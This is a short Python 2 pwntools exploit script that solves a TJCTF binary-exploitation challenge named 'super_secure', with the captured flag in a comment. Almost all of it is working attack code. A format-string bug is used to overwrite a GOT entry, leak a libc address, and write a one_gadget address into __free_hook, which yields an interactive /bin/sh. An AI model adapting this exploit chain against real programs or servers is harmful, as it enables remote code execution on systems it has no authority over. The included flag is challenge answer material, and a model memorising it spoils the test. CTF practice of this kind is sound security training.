# 0x4f2c5	execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   rcx == NULL

# 0x4f322	execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a38c	execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL

# flag: tjctf{4r3_f0rm47_57r1n65_63771n6_0ld_y37?}
from pwn import *


# context.log_level = 'debug'
context.binary = './super_secure'

sh = process('./super_secure')
# sh = remote('problem1.tjctf.org', 8009)


def send_payload(payload, p=False):
  sh.sendlineafter('> ', 's')
  sh.sendlineafter(':\n', '123')
  sh.sendlineafter(':\n', payload)
  sh.sendlineafter('> ', 'v')
  sh.sendlineafter(':\n', '123')
  if p:
    sh.recvuntil('====================\n')
    out = sh.recvuntil('====================\n').split('\n')[0]
    print out
  sh.sendline('')
  if p:
    return out

memset_got = 0x00602050
strcmp_got = 0x00602070

secure_service = 0x00400da0

# stage 1: make it loop

stage1 = '%{}x'.format(secure_service)
stage1 += '%28$n  '
stage1 += p64(memset_got)

send_payload(stage1)

# stage 2: leak libc

# for i in range(1, 50):
#   send_payload('%{}$llx'.format(i), True)

output = int(send_payload('%1$llx', True), 16)
system_c = output - 3789731
lib_c_base = system_c - 0x0004f440
pwn_adrr = lib_c_base + 0x10a38c
free_hook = lib_c_base + 0x001ed8e8 + 0x200000

print hex(lib_c_base)
print hex(pwn_adrr)
print hex(free_hook)

pause()

# stage 3: pwn
goal = hex(pwn_adrr+0x10000000000000000)[3:]
for i in range(len(goal), 4, -4):
  stage3 = '%{}x'.format(int(goal[i-4:i], 16))
  l = len(stage3)
  stage3 += '%28$n'.ljust(16-l)
  stage3 += p64(free_hook+(16-i)/2)
  send_payload(stage3, True)

send_payload('%65537c')

sh.interactive()